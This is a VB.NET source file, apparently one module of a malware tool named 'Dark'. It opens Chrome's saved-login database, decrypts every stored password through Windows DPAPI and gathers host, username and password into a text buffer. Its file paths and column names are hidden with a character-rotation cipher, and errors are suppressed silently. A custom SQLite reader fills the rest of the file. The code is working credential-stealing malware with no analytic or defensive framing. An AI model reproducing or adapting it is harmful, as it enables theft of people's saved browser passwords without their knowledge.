Namespace Dark
#Region "Chrome"

    Public Module DecryptChr
        Public Class Chrome
        End Class
        Public Function GetChr() As String
            Dim Buffer As String = NativeMethods.RotateRight("888888888888888888888888888888888>cmjh`8888888888888888888888888888888888") & Environment.NewLine
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + NativeMethods.RotateRight("WBjjbg`W>cmjh`WPn`m?\o\W?`a\pgoWGjbdi?\o\")
            Try
                Dim SQLDatabase = New SQLiteHandler(datapath)
                SQLDatabase.ReadTable("logins")

                If IO.File.Exists(datapath) Then

                    Dim host As String
                    Dim user As String
                    Dim pass As String

                    For i As Int32 = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                        host = SQLDatabase.GetValue(i, NativeMethods.RotateRight("jmdbdiZpmg"))
                        user = SQLDatabase.GetValue(i, NativeMethods.RotateRight("pn`mi\h`Zq\gp`"))
                        pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, NativeMethods.RotateRight("k\nnrjm_Zq\gp`"))))

                        If (user <> "") And (pass <> "") Then
                            Buffer += ("Host: " + host & vbNewLine & "UserName: " + user & vbNewLine & "Password: " + pass & vbNewLine + "=========================================================================" & vbNewLine)

                        End If
                    Next
                End If
            Catch e As Exception

            End Try
            Return Buffer
        End Function
        <Runtime.InteropServices.DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
        Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
        End Function
        <Flags()> Enum CryptProtectPromptFlags
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
            CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
        End Enum
        <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential, CharSet:=Runtime.InteropServices.CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
            Public cbSize As Integer
            Public dwPromptFlags As CryptProtectPromptFlags
            Public hwndApp As IntPtr
            Public szPrompt As String
        End Structure
        <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential, CharSet:=Runtime.InteropServices.CharSet.Unicode)> Structure DATA_BLOB
            Public cbData As Integer
            Public pbData As IntPtr
        End Structure
        Function Decrypt(ByVal Datas() As Byte) As String
            Dim inj, Ors As New DATA_BLOB
            Dim Ghandle As Runtime.InteropServices.GCHandle = Runtime.InteropServices.GCHandle.Alloc(Datas, Runtime.InteropServices.GCHandleType.Pinned)
            inj.pbData = Ghandle.AddrOfPinnedObject()
            inj.cbData = Datas.Length
            Ghandle.Free()
            CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
            Dim Returned() As Byte = New Byte(Ors.cbData) {}
            Runtime.InteropServices.Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
            Dim TheString As String = System.Text.Encoding.Default.GetString(Returned)
            Return TheString.Substring(0, TheString.Length - 1)
        End Function
    End Module

    Public Class SQLiteHandler
        Private db_bytes() As Byte
        Private page_size As UInt16
        Private encoding As UInt64
        Private master_table_entries() As sqlite_master_entry

        Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
        Private table_entries() As table_entry
        Private field_names() As String

        Private Structure record_header_field
            Dim size As Int64
            Dim type As Int64
        End Structure

        Private Structure table_entry
            Dim row_id As Int64
            Dim content() As String
        End Structure

        Private Structure sqlite_master_entry
            Dim row_id As Int64
            Dim item_type As String
            Dim item_name As String
            Dim astable_name As String
            Dim root_num As Int64
            Dim sql_statement As String
        End Structure

        Private Function GVL(ByVal startIndex As Integer) As Integer
            If startIndex > db_bytes.Length Then Return Nothing

            For i As Int32 = startIndex To startIndex + 8 Step 1
                If i > db_bytes.Length - 1 Then
                    Return Nothing
                ElseIf (db_bytes(i) And &H80) <> &H80 Then
                    Return i
                End If
            Next

            Return startIndex + 8
        End Function

        Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
            endIndex = endIndex + 1

            Dim retus(7) As Byte
            Dim Length = endIndex - startIndex
            Dim Bit64 As Boolean = False

            If Length = 0 Or Length > 9 Then Return Nothing
            If Length = 1 Then
                retus(0) = CByte((db_bytes(startIndex) And &H7F))
                Return BitConverter.ToInt64(retus, 0)
            End If

            If Length = 9 Then
                Bit64 = True
            End If

            Dim j As Integer = 1
            Dim k As Integer = 7
            Dim y As Integer = 0

            If Bit64 Then
                retus(0) = db_bytes(endIndex - 1)
                endIndex = endIndex - 1
                y = 1
            End If

            For i As Int32 = (endIndex - 1) To startIndex Step -1
                If (i - 1) >= startIndex Then
                    retus(y) = CByte(((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k))
                    j = j + 1
                    y = y + 1
                    k = k - 1
                Else
                    If Not Bit64 Then retus(y) = CByte(((db_bytes(i) >> (j - 1)) And (&HFF >> j)))
                End If
            Next

            Return BitConverter.ToInt64(retus, 0)
        End Function

        Private Function IsOdd(ByVal value As Int64) As Boolean
            Return (value And 1) = 1
        End Function

        Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
            If Size > 8 Or Size = 0 Then Return Nothing

            Dim retVal As UInt64 = 0

            For i As Int32 = 0 To Size - 1 Step 1
                retVal = ((retVal << 8) Or db_bytes(startIndex + i))
            Next

            Return retVal
        End Function

        Private Sub ReadMasterTable(ByVal Offset As UInt64)

            If db_bytes(CInt(Offset)) = &HD Then

                Dim Length As UInt16 = CUShort(ConvertToInteger(CInt(Offset + 3), 2) - 1)
                Dim ol As Integer = 0

                If Not master_table_entries Is Nothing Then
                    ol = master_table_entries.Length
                    ReDim Preserve master_table_entries(master_table_entries.Length + Length)
                Else
                    ReDim master_table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Int32 = 0 To Length Step 1
                    ent_offset = ConvertToInteger(CInt(Offset + 8 + (i * 2)), 2)

                    If Offset <> 100 Then ent_offset = ent_offset + Offset

                    Dim t = GVL(CInt(ent_offset))
                    Dim size As Int64 = CVL(CInt(ent_offset), CInt(t))

                    Dim s = GVL(CInt(ent_offset + (t - ent_offset) + 1))
                    master_table_entries(ol + i).row_id = CVL(CInt(ent_offset + (t - ent_offset) + 1), CInt(s))
                    ent_offset = CULng(ent_offset + (s - ent_offset) + 1)

                    t = GVL(CInt(ent_offset))
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(CInt(ent_offset), CInt(t))

                    Dim Field_Size(4) As Int64

                    For j As Int32 = 0 To 4 Step 1
                        t = s + 1
                        s = GVL(CInt(t))
                        Field_Size(j) = CVL(CInt(t), CInt(s))

                        If Field_Size(j) > 9 Then
                            If IsOdd(Field_Size(j)) Then
                                Field_Size(j) = CLng((Field_Size(j) - 13) / 2)
                            Else
                                Field_Size(j) = CLng((Field_Size(j) - 12) / 2)
                            End If
                        Else
                            Field_Size(j) = SQLDataTypeSize(CInt(Field_Size(j)))
                        End If
                    Next

                    If encoding = 1 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size), CInt(Field_Size(0)))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size), CInt(Field_Size(0)))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size), CInt(Field_Size(0)))
                    End If
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0)), CInt(Field_Size(1)))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0)), CInt(Field_Size(1)))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0)), CInt(Field_Size(1)))
                    End If
                    master_table_entries(ol + i).root_num = CLng(ConvertToInteger(CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2)), CInt(Field_Size(3))))
                    If encoding = 1 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3)), CInt(Field_Size(4)))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3)), CInt(Field_Size(4)))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3)), CInt(Field_Size(4)))
                    End If
                Next
            ElseIf db_bytes(CInt(Offset)) = &H5 Then
                Dim Length As UInt16 = CUShort(ConvertToInteger(CInt(Offset + 3), 2) - 1)
                Dim ent_offset As UInt16

                For i As Int32 = 0 To Length Step 1
                    ent_offset = CUShort(ConvertToInteger(CInt(Offset + 12 + (i * 2)), 2))

                    If Offset = 100 Then
                        ReadMasterTable(CULng((ConvertToInteger(ent_offset, 4) - 1) * page_size))
                    Else
                        ReadMasterTable(CULng((ConvertToInteger(CInt(Offset + ent_offset), 4) - 1) * page_size))
                    End If

                Next

                ReadMasterTable(CULng((ConvertToInteger(CInt(Offset + 8), 4) - 1) * page_size))
            End If
        End Sub

        Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
            If db_bytes(CInt(Offset)) = &HD Then

                Dim Length As UInt16 = CUShort(ConvertToInteger(CInt(Offset + 3), 2) - 1)
                Dim ol As Integer = 0

                If Not table_entries Is Nothing Then
                    ol = table_entries.Length
                    ReDim Preserve table_entries(table_entries.Length + Length)
                Else
                    ReDim table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Int32 = 0 To Length Step 1
                    ent_offset = ConvertToInteger(CInt(Offset + 8 + (i * 2)), 2)

                    If Offset <> 100 Then ent_offset = ent_offset + Offset

                    Dim t = GVL(CInt(ent_offset))
                    Dim size As Int64 = CVL(CInt(ent_offset), CInt(t))

                    Dim s = GVL(CInt(ent_offset + (t - ent_offset) + 1))
                    table_entries(ol + i).row_id = CVL(CInt(ent_offset + (t - ent_offset) + 1), CInt(s))
                    ent_offset = CULng(ent_offset + (s - ent_offset) + 1)
                    t = GVL(CInt(ent_offset))
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(CInt(ent_offset), CInt(t))
                    Dim Field_Size() As record_header_field = Nothing
                    Dim size_read As Int64 = CLng((ent_offset - t) + 1)
                    Dim j = 0
                    While size_read < Rec_Header_Size
                        ReDim Preserve Field_Size(j)

                        t = s + 1
                        s = GVL(CInt(t))
                        Field_Size(j).type = CVL(CInt(t), CInt(s))

                        If Field_Size(j).type > 9 Then
                            If IsOdd(Field_Size(j).type) Then
                                Field_Size(j).size = CLng((Field_Size(j).type - 13) / 2)
                            Else
                                Field_Size(j).size = CLng((Field_Size(j).type - 12) / 2)
                            End If
                        Else
                            Field_Size(j).size = SQLDataTypeSize(CInt(Field_Size(j).type))
                        End If

                        size_read = size_read + (s - t) + 1
                        j = j + 1
                    End While

                    ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                    Dim counter As Integer = 0

                    For k As Int32 = 0 To Field_Size.Length - 1 Step 1
                        If Field_Size(k).type > 9 Then
                            If Not IsOdd(Field_Size(k).type) Then
                                If encoding = 1 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).size))
                                ElseIf encoding = 2 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).size))
                                ElseIf encoding = 3 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).size))
                                End If
                            Else
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).size))
                            End If
                        Else
                            table_entries(ol + i).content(k) = CStr(ConvertToInteger(CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).size)))
                        End If

                        counter = CInt(counter + Field_Size(k).size)
                    Next
                Next
            ElseIf db_bytes(CInt(Offset)) = &H5 Then
                Dim Length As UInt16 = CUShort(ConvertToInteger(CInt(Offset + 3), 2) - 1)
                Dim ent_offset As UInt16

                For i As Int32 = 0 To Length Step 1
                    ent_offset = CUShort(ConvertToInteger(CInt(Offset + 12 + (i * 2)), 2))

                    ReadTableFromOffset(CULng((ConvertToInteger(CInt(Offset + ent_offset), 4) - 1) * page_size))
                Next

                ReadTableFromOffset(CULng((ConvertToInteger(CInt(Offset + 8), 4) - 1) * page_size))
            End If

            Return True
        End Function

        Public Function ReadTable(ByVal TableName As String) As Boolean
            Dim found As Integer = -1

            For i As Int32 = 0 To master_table_entries.Length Step 1
                If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return False

            Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(CChar(","))

            For i As Int32 = 0 To fields.Length - 1 Step 1
                fields(i) = LTrim(CStr(fields(i)))

                Dim index = fields(i).IndexOf(" ")

                If index > 0 Then fields(i) = fields(i).Substring(0, index)

                If fields(i).IndexOf("UNIQUE") = 0 Then
                    Exit For
                Else
                    ReDim Preserve field_names(i)
                    field_names(i) = CStr(fields(i))
                End If
            Next

            Return ReadTableFromOffset(CULng((master_table_entries(found).root_num - 1) * page_size))
        End Function

        Public Function GetRowCount() As Integer
            Return table_entries.Length
        End Function

        Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
            If row_num >= table_entries.Length Then Return Nothing
            If field >= table_entries(row_num).content.Length Then Return Nothing

            Return table_entries(row_num).content(field)
        End Function

        Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
            Dim found As Integer = -1

            For i As Int32 = 0 To field_names.Length Step 1
                If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return Nothing

            Return GetValue(row_num, found)
        End Function

        Public Function GetTableNames() As String()
            Dim retVal As String() = Nothing
            Dim arr = 0

            For i As Int32 = 0 To master_table_entries.Length - 1 Step 1
                If master_table_entries(i).item_type = "table" Then
                    ReDim Preserve retVal(arr)
                    retVal(arr) = master_table_entries(i).item_name
                    arr = arr + 1
                End If
            Next

            Return retVal
        End Function

        Public Sub New(ByVal baseName As String)
            If IO.File.Exists(baseName) Then
                FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                Dim asi As String = Space(CInt(LOF(1)))
                FileGet(1, asi)
                FileClose(1)

                db_bytes = System.Text.Encoding.Default.GetBytes(asi)

                If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo(NativeMethods.RotateRight("NLGdo`ajmh\o.")) <> 0 Then
                    Throw New Exception("0")
                End If

                If db_bytes(52) <> 0 Then
                    Throw New Exception("0")
                ElseIf ConvertToInteger(44, 4) >= 4 Then
                    Throw New Exception("0")
                End If

                page_size = CUShort(ConvertToInteger(16, 2))
                encoding = ConvertToInteger(56, 4)

                If encoding = 0 Then encoding = 1

                ReadMasterTable(100)
            End If
        End Sub
    End Class

#End Region
End Namespace